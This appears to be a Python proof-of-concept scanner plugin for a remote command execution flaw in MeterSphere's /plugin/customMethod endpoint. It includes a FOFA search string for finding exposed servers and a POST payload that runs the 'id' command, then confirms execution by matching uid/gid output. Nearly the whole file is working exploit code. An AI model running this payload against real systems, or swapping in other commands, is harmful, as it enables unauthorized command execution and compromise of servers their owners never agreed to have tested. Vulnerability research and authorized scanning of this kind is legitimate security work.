#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  'https://mp.weixin.qq.com/s/p7luLmeteCvGVbaUx0eIRw',

      'method'    :   'post',

      'bugname'   :   'MeterSphere customMethod 远程命令执行',

      'level'     :   'high',

      'FOFA'      :   'title="MeterSphere"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/json',
      }
  target = '/plugin/customMethod'
  data = '{"entry":"Evil","request":"id"}'
  url1 = url + target
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=7,verify=False)
    if res.status_code == 200 and re.search(r'uid.*?gid.*?groups.*?',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret